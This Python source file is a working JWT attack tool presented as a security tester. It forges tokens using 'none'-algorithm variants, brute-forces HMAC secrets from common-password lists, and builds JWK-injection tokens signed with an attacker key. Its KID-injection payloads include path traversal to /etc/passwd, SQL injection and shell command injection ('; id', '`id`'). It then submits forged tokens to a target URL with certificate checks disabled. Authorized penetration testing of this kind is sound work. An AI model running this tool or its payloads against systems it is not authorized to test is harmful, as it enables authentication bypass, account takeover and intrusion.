"""
JWT Security Testing Wrapper

Comprehensive JWT security testing including:
- Token decoding and analysis
- Algorithm confusion attacks (RS256 -> HS256)
- None algorithm bypass
- Weak secret brute forcing
- Key confusion attacks
- Token manipulation
- Expiration bypass
- JWK injection
- Kid injection
"""
import sys
import argparse
import json
import base64
import hmac
import hashlib
import time
from pathlib import Path
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from utils.base_wrapper import APITool
from utils.output_parser import Finding, Severity


@dataclass
class JWTFinding:
    """Represents a JWT security finding"""
    test_type: str
    title: str
    description: str
    severity: str
    evidence: str = ""
    payload: str = ""
    forged_token: str = ""
    vulnerable: bool = False


@dataclass
class DecodedJWT:
    """Decoded JWT components"""
    header: Dict
    payload: Dict
    signature: str
    raw_header: str
    raw_payload: str


class JWTTester(APITool):
    """JWT security testing wrapper."""

    # Common weak secrets for brute forcing
    COMMON_SECRETS = [
        'secret', 'password', '123456', 'qwerty', 'admin',
        'letmein', 'welcome', 'monkey', 'dragon', 'master',
        'login', 'abc123', 'passw0rd', '12345678', 'test',
        'guest', 'default', 'changeme', 'pass', '1234',
        'jwt_secret', 'jwt-secret', 'jwtSecret', 'JWT_SECRET',
        'api_key', 'apikey', 'api-key', 'secret_key', 'secretkey',
        'supersecret', 'super_secret', 'topsecret', 'top_secret',
        'private_key', 'privatekey', 'private-key',
        'your-256-bit-secret', 'your-secret-key',
    ]

    # Extended wordlist paths
    WORDLIST_PATHS = [
        '/usr/share/wordlists/rockyou.txt',
        '/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt',
        '~/.config/jwt-wordlist.txt',
        'config/wordlists/jwt-secrets.txt',
    ]

    @property
    def tool_name(self) -> str:
        return "jwt_tester"

    def _build_target_args(self, target: str, **kwargs) -> List[str]:
        """JWT tester is pure Python."""
        return []

    def check_tool_installed(self) -> bool:
        """Check if JWT dependencies are available."""
        try:
            import jwt
            return True
        except ImportError:
            # Fall back to manual JWT handling
            return True

    def run(self, target: str, output_file: str = None, **kwargs) -> Dict[str, Any]:
        """Run JWT security tests."""
        from datetime import datetime

        self.start_time = datetime.now()
        findings = []

        token = target  # Target is the JWT token
        test_url = kwargs.get('test_url')
        headers = kwargs.get('headers', {})
        test_types = kwargs.get('tests', 'all')
        wordlist = kwargs.get('wordlist')

        print(f"[*] Analyzing JWT Token...")

        # Decode the token
        decoded = self.decode_jwt(token)
        if not decoded:
            return {
                'success': False,
                'error': 'Invalid JWT format',
                'tool': self.tool_name,
                'target': target[:50] + '...'
            }

        print(f"[+] Token decoded successfully")
        print(f"    Algorithm: {decoded.header.get('alg', 'N/A')}")
        print(f"    Type: {decoded.header.get('typ', 'N/A')}")

        # Run selected tests
        if test_types == 'all' or 'analyze' in test_types:
            print("\n[*] Analyzing token structure...")
            findings.extend(self.analyze_token(decoded))

        if test_types == 'all' or 'none' in test_types:
            print("\n[*] Testing 'none' algorithm bypass...")
            findings.extend(self.test_none_algorithm(decoded, test_url, headers))

        if test_types == 'all' or 'alg_confusion' in test_types:
            print("\n[*] Testing algorithm confusion...")
            findings.extend(self.test_algorithm_confusion(decoded, test_url, headers))

        if test_types == 'all' or 'weak_secret' in test_types:
            print("\n[*] Testing for weak secrets...")
            findings.extend(self.test_weak_secret(token, decoded, wordlist))

        if test_types == 'all' or 'exp_bypass' in test_types:
            print("\n[*] Testing expiration bypass...")
            findings.extend(self.test_expiration_bypass(decoded, test_url, headers))

        if test_types == 'all' or 'kid' in test_types:
            print("\n[*] Testing KID injection...")
            findings.extend(self.test_kid_injection(decoded, test_url, headers))

        if test_types == 'all' or 'jwk' in test_types:
            print("\n[*] Testing JWK injection...")
            findings.extend(self.test_jwk_injection(decoded, test_url, headers))

        self.end_time = datetime.now()
        duration = (self.end_time - self.start_time).total_seconds()

        vulnerable_findings = [f for f in findings if f.vulnerable]

        # Save results
        if output_file is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = self.output_dir / f"jwt_test_{timestamp}.json"

        results_data = {
            'token_preview': token[:50] + '...',
            'duration': duration,
            'total_tests': len(findings),
            'vulnerabilities_found': len(vulnerable_findings),
            'decoded': {
                'header': decoded.header,
                'payload': decoded.payload
            },
            'findings': [
                {
                    'test_type': f.test_type,
                    'title': f.title,
                    'description': f.description,
                    'severity': f.severity,
                    'evidence': f.evidence,
                    'forged_token': f.forged_token[:100] + '...' if len(f.forged_token) > 100 else f.forged_token,
                    'vulnerable': f.vulnerable
                }
                for f in findings
            ]
        }

        with open(output_file, 'w') as f:
            json.dump(results_data, f, indent=2)
        print(f"\n[+] Results saved to: {output_file}")

        return {
            'success': True,
            'tool': self.tool_name,
            'target': token[:50] + '...',
            'duration': duration,
            'output_file': str(output_file),
            'decoded': decoded,
            'results': findings,
            'vulnerabilities_count': len(vulnerable_findings)
        }

    def decode_jwt(self, token: str) -> Optional[DecodedJWT]:
        """Decode JWT without verification."""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return None

            # Decode header
            header_b64 = parts[0]
            header_padded = header_b64 + '=' * (4 - len(header_b64) % 4)
            header = json.loads(base64.urlsafe_b64decode(header_padded))

            # Decode payload
            payload_b64 = parts[1]
            payload_padded = payload_b64 + '=' * (4 - len(payload_b64) % 4)
            payload = json.loads(base64.urlsafe_b64decode(payload_padded))

            return DecodedJWT(
                header=header,
                payload=payload,
                signature=parts[2],
                raw_header=parts[0],
                raw_payload=parts[1]
            )
        except Exception as e:
            print(f"[!] Decode error: {e}")
            return None

    def _encode_base64url(self, data: dict) -> str:
        """Encode dict to base64url."""
        json_str = json.dumps(data, separators=(',', ':'))
        encoded = base64.urlsafe_b64encode(json_str.encode()).decode()
        return encoded.rstrip('=')

    def _sign_hs256(self, message: str, secret: str) -> str:
        """Sign message with HS256."""
        signature = hmac.new(
            secret.encode(),
            message.encode(),
            hashlib.sha256
        ).digest()
        return base64.urlsafe_b64encode(signature).decode().rstrip('=')

    def analyze_token(self, decoded: DecodedJWT) -> List[JWTFinding]:
        """Analyze token structure for security issues."""
        findings = []

        # Check algorithm
        alg = decoded.header.get('alg', '')

        if alg.lower() == 'none':
            findings.append(JWTFinding(
                test_type='weak_algorithm',
                title='None Algorithm Detected',
                description='Token uses "none" algorithm which requires no signature',
                severity='critical',
                evidence=f'Algorithm: {alg}',
                vulnerable=True
            ))

        if alg in ['HS256', 'HS384', 'HS512']:
            findings.append(JWTFinding(
                test_type='symmetric_algorithm',
                title='Symmetric Algorithm Used',
                description=f'Token uses symmetric algorithm {alg} which may be vulnerable to brute forcing',
                severity='info',
                evidence=f'Algorithm: {alg}',
                vulnerable=False
            ))

        # Check for sensitive data in payload
        sensitive_fields = ['password', 'secret', 'key', 'token', 'credit_card', 'ssn']
        for field in sensitive_fields:
            if field in str(decoded.payload).lower():
                findings.append(JWTFinding(
                    test_type='sensitive_data',
                    title='Sensitive Data in Payload',
                    description=f'Token payload may contain sensitive field: {field}',
                    severity='medium',
                    evidence=f'Field pattern: {field}',
                    vulnerable=True
                ))

        # Check expiration
        exp = decoded.payload.get('exp')
        if not exp:
            findings.append(JWTFinding(
                test_type='no_expiration',
                title='No Expiration Claim',
                description='Token does not have an expiration time (exp claim)',
                severity='medium',
                evidence='Missing exp claim',
                vulnerable=True
            ))
        elif exp < time.time():
            findings.append(JWTFinding(
                test_type='expired_token',
                title='Token Expired',
                description=f'Token has expired (exp: {exp})',
                severity='info',
                evidence=f'Expired at: {time.ctime(exp)}',
                vulnerable=False
            ))

        # Check for long-lived tokens
        if exp and exp - time.time() > 86400 * 30:  # 30 days
            findings.append(JWTFinding(
                test_type='long_lived_token',
                title='Long-Lived Token',
                description='Token has expiration more than 30 days in the future',
                severity='low',
                evidence=f'Expires: {time.ctime(exp)}',
                vulnerable=True
            ))

        # Check JKU/X5U headers (potential SSRF)
        if 'jku' in decoded.header:
            findings.append(JWTFinding(
                test_type='jku_header',
                title='JKU Header Present',
                description='Token contains JKU header which may be exploitable for SSRF',
                severity='medium',
                evidence=f'JKU: {decoded.header.get("jku")}',
                vulnerable=True
            ))

        if 'x5u' in decoded.header:
            findings.append(JWTFinding(
                test_type='x5u_header',
                title='X5U Header Present',
                description='Token contains X5U header which may be exploitable',
                severity='medium',
                evidence=f'X5U: {decoded.header.get("x5u")}',
                vulnerable=True
            ))

        return findings

    def test_none_algorithm(self, decoded: DecodedJWT, test_url: str = None,
                           headers: Dict = None) -> List[JWTFinding]:
        """Test 'none' algorithm bypass."""
        findings = []

        # Create token with 'none' algorithm
        none_headers = [
            {'alg': 'none', 'typ': 'JWT'},
            {'alg': 'None', 'typ': 'JWT'},
            {'alg': 'NONE', 'typ': 'JWT'},
            {'alg': 'nOnE', 'typ': 'JWT'},
        ]

        for none_header in none_headers:
            header_b64 = self._encode_base64url(none_header)
            payload_b64 = decoded.raw_payload

            # Try with empty signature and without trailing dot
            forged_tokens = [
                f"{header_b64}.{payload_b64}.",
                f"{header_b64}.{payload_b64}",
            ]

            for forged_token in forged_tokens:
                # Test against URL if provided
                if test_url:
                    if self._test_token_validity(test_url, forged_token, headers):
                        findings.append(JWTFinding(
                            test_type='none_algorithm_bypass',
                            title='None Algorithm Bypass Successful',
                            description='Server accepts tokens with "none" algorithm',
                            severity='critical',
                            evidence=f'Algorithm variant: {none_header["alg"]}',
                            forged_token=forged_token,
                            vulnerable=True
                        ))
                        print(f"    [+] None algorithm ACCEPTED: {none_header['alg']}")
                        return findings

        # Store forged token even if not tested
        findings.append(JWTFinding(
            test_type='none_algorithm',
            title='None Algorithm Token Created',
            description='Created token with none algorithm for manual testing',
            severity='info',
            forged_token=forged_tokens[0],
            vulnerable=False
        ))

        return findings

    def test_algorithm_confusion(self, decoded: DecodedJWT, test_url: str = None,
                                headers: Dict = None) -> List[JWTFinding]:
        """Test RS256 to HS256 algorithm confusion."""
        findings = []
        original_alg = decoded.header.get('alg', '')

        # Only applicable for RS* algorithms
        if not original_alg.startswith('RS') and not original_alg.startswith('ES') and not original_alg.startswith('PS'):
            findings.append(JWTFinding(
                test_type='alg_confusion_na',
                title='Algorithm Confusion Not Applicable',
                description=f'Token uses {original_alg}, algorithm confusion attack not applicable',
                severity='info',
                vulnerable=False
            ))
            return findings

        # For RS256 -> HS256 confusion, we would need the public key
        # This creates the token structure for manual testing with a known public key

        findings.append(JWTFinding(
            test_type='alg_confusion_potential',
            title='Potential Algorithm Confusion',
            description=f'Token uses {original_alg}. If public key is known, HS256 confusion attack may be possible',
            severity='medium',
            evidence=f'Original algorithm: {original_alg}',
            vulnerable=True
        ))

        return findings

    def test_weak_secret(self, token: str, decoded: DecodedJWT,
                        wordlist: str = None) -> List[JWTFinding]:
        """Test for weak HMAC secrets."""
        findings = []
        alg = decoded.header.get('alg', '')

        if not alg.startswith('HS'):
            findings.append(JWTFinding(
                test_type='weak_secret_na',
                title='Weak Secret Test Not Applicable',
                description=f'Token uses {alg}, weak secret test only applies to HMAC algorithms',
                severity='info',
                vulnerable=False
            ))
            return findings

        # Load wordlist
        secrets_to_try = self.COMMON_SECRETS.copy()

        if wordlist:
            try:
                with open(wordlist, 'r', errors='ignore') as f:
                    secrets_to_try.extend([line.strip() for line in f if line.strip()][:10000])
            except FileNotFoundError:
                print(f"    [!] Wordlist not found: {wordlist}")

        print(f"    [*] Testing {len(secrets_to_try)} secrets...")

        # Try to crack the secret
        message = f"{decoded.raw_header}.{decoded.raw_payload}"

        for i, secret in enumerate(secrets_to_try):
            if i % 1000 == 0 and i > 0:
                print(f"    [*] Tested {i} secrets...")

            try:
                computed_sig = self._sign_hs256(message, secret)

                if computed_sig == decoded.signature:
                    findings.append(JWTFinding(
                        test_type='weak_secret',
                        title='Weak JWT Secret Found',
                        description=f'JWT secret cracked successfully',
                        severity='critical',
                        evidence=f'Secret: {secret}',
                        vulnerable=True
                    ))
                    print(f"    [+] SECRET FOUND: {secret}")
                    return findings
            except Exception:
                continue

        findings.append(JWTFinding(
            test_type='weak_secret_not_found',
            title='Secret Not Found',
            description=f'JWT secret not found in {len(secrets_to_try)} attempts',
            severity='info',
            evidence=f'Tested {len(secrets_to_try)} secrets',
            vulnerable=False
        ))

        return findings

    def test_expiration_bypass(self, decoded: DecodedJWT, test_url: str = None,
                               headers: Dict = None) -> List[JWTFinding]:
        """Test expiration bypass techniques."""
        findings = []

        # Modify expiration to future
        modified_payload = decoded.payload.copy()
        modified_payload['exp'] = int(time.time()) + 86400 * 365  # 1 year from now
        modified_payload['iat'] = int(time.time())

        # Remove exp claim
        payload_no_exp = {k: v for k, v in decoded.payload.items() if k != 'exp'}

        # Note: These would need to be signed with the correct key to be valid
        findings.append(JWTFinding(
            test_type='exp_bypass_potential',
            title='Expiration Bypass Technique',
            description='Modified tokens created for expiration bypass testing (require valid signature)',
            severity='info',
            evidence='Tokens with modified/removed exp claim created',
            vulnerable=False
        ))

        return findings

    def test_kid_injection(self, decoded: DecodedJWT, test_url: str = None,
                          headers: Dict = None) -> List[JWTFinding]:
        """Test KID (Key ID) header injection."""
        findings = []

        # KID injection payloads
        kid_payloads = [
            # Path traversal
            '../../../../../../../dev/null',
            '../../../../../../etc/passwd',
            '/dev/null',
            # SQL injection
            "' OR '1'='1",
            "1' UNION SELECT 'secret'--",
            # Command injection
            '|id',
            '; id',
            '`id`',
        ]

        # Create tokens with injected KID
        for payload in kid_payloads:
            modified_header = decoded.header.copy()
            modified_header['kid'] = payload

            header_b64 = self._encode_base64url(modified_header)
            forged_token = f"{header_b64}.{decoded.raw_payload}."

            if test_url:
                if self._test_token_validity(test_url, forged_token, headers):
                    findings.append(JWTFinding(
                        test_type='kid_injection',
                        title='KID Injection Successful',
                        description='Server accepts tokens with injected KID header',
                        severity='critical',
                        evidence=f'KID payload: {payload}',
                        forged_token=forged_token,
                        vulnerable=True
                    ))
                    return findings

        findings.append(JWTFinding(
            test_type='kid_injection_potential',
            title='KID Injection Tokens Created',
            description='Created tokens with KID injection payloads for manual testing',
            severity='info',
            evidence=f'Payloads tested: {len(kid_payloads)}',
            vulnerable=False
        ))

        return findings

    def test_jwk_injection(self, decoded: DecodedJWT, test_url: str = None,
                          headers: Dict = None) -> List[JWTFinding]:
        """Test JWK (JSON Web Key) header injection."""
        findings = []

        # Create a malicious JWK for HS256
        malicious_jwk = {
            "kty": "oct",
            "kid": "attacker-key",
            "use": "sig",
            "k": base64.urlsafe_b64encode(b"attacker-secret").decode().rstrip('='),
            "alg": "HS256"
        }

        # Create token with embedded JWK
        modified_header = {
            "alg": "HS256",
            "typ": "JWT",
            "jwk": malicious_jwk
        }

        header_b64 = self._encode_base64url(modified_header)
        payload_b64 = decoded.raw_payload
        message = f"{header_b64}.{payload_b64}"

        # Sign with our known secret
        signature = self._sign_hs256(message, "attacker-secret")
        forged_token = f"{header_b64}.{payload_b64}.{signature}"

        if test_url:
            if self._test_token_validity(test_url, forged_token, headers):
                findings.append(JWTFinding(
                    test_type='jwk_injection',
                    title='JWK Injection Successful',
                    description='Server accepts tokens with embedded JWK header',
                    severity='critical',
                    evidence='Server used embedded JWK for verification',
                    forged_token=forged_token,
                    vulnerable=True
                ))
                return findings

        findings.append(JWTFinding(
            test_type='jwk_injection_potential',
            title='JWK Injection Token Created',
            description='Created token with embedded JWK for manual testing',
            severity='info',
            forged_token=forged_token,
            vulnerable=False
        ))

        return findings

    def _test_token_validity(self, url: str, token: str, headers: Dict = None) -> bool:
        """Test if a forged token is accepted by the server."""
        import requests

        test_headers = headers.copy() if headers else {}
        test_headers['Authorization'] = f'Bearer {token}'

        try:
            response = requests.get(url, headers=test_headers, timeout=10, verify=False)
            # Consider 200 or 2xx as success
            return 200 <= response.status_code < 300
        except Exception:
            return False

    def forge_token(self, decoded: DecodedJWT, secret: str,
                   modifications: Dict = None) -> str:
        """Forge a new token with modifications."""
        header = decoded.header.copy()
        payload = decoded.payload.copy()

        if modifications:
            if 'header' in modifications:
                header.update(modifications['header'])
            if 'payload' in modifications:
                payload.update(modifications['payload'])

        header_b64 = self._encode_base64url(header)
        payload_b64 = self._encode_base64url(payload)
        message = f"{header_b64}.{payload_b64}"

        signature = self._sign_hs256(message, secret)

        return f"{header_b64}.{payload_b64}.{signature}"


def main():
    parser = argparse.ArgumentParser(
        description="JWT Security Tester - Comprehensive JWT vulnerability testing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python jwt_tester.py -t "eyJhbGciOiJIUzI1NiIs..."
  python jwt_tester.py -t "eyJ..." --url https://api.example.com/me --tests none,weak_secret
  python jwt_tester.py -t "eyJ..." --wordlist /path/to/wordlist.txt
  python jwt_tester.py -t "eyJ..." --url https://api.example.com/admin -H "Cookie: session=xxx"
        """
    )

    parser.add_argument("-t", "--token", required=True, help="JWT token to test")
    parser.add_argument("--url", dest="test_url",
                       help="URL to test forged tokens against")
    parser.add_argument("-H", "--header", action="append", dest="headers",
                       help="HTTP headers for testing (format: 'Name: Value')")
    parser.add_argument("--tests", default="all",
                       help="Tests to run: all, analyze, none, alg_confusion, weak_secret, exp_bypass, kid, jwk")
    parser.add_argument("--wordlist", help="Wordlist for secret brute forcing")
    parser.add_argument("-o", "--output", help="Output file (JSON)")

    args = parser.parse_args()

    tester = JWTTester()

    # Parse headers
    headers = {}
    if args.headers:
        for h in args.headers:
            if ': ' in h:
                name, value = h.split(': ', 1)
                headers[name] = value

    result = tester.run(
        target=args.token,
        output_file=args.output,
        test_url=args.test_url,
        headers=headers,
        tests=args.tests,
        wordlist=args.wordlist
    )

    if result['success']:
        vuln_findings = [f for f in result['results'] if f.vulnerable]
        print(f"\n{'='*60}")
        print(f"JWT Security Assessment Complete")
        print(f"{'='*60}")
        print(f"\nDecoded Token:")
        print(f"  Header: {result['decoded'].header}")
        print(f"  Payload: {result['decoded'].payload}")
        print(f"\nTotal tests: {len(result['results'])}")
        print(f"Vulnerabilities: {len(vuln_findings)}")

        if vuln_findings:
            print("\n[!] Vulnerabilities Found:")
            for finding in vuln_findings:
                print(f"\n  [{finding.severity.upper()}] {finding.title}")
                print(f"  {finding.description}")
                if finding.evidence:
                    print(f"  Evidence: {finding.evidence}")
                if finding.forged_token:
                    print(f"  Forged Token: {finding.forged_token[:80]}...")
    else:
        print(f"\n[-] Error: {result.get('error', 'Unknown error')}")

    return 0 if result['success'] else 1


if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    sys.exit(main())
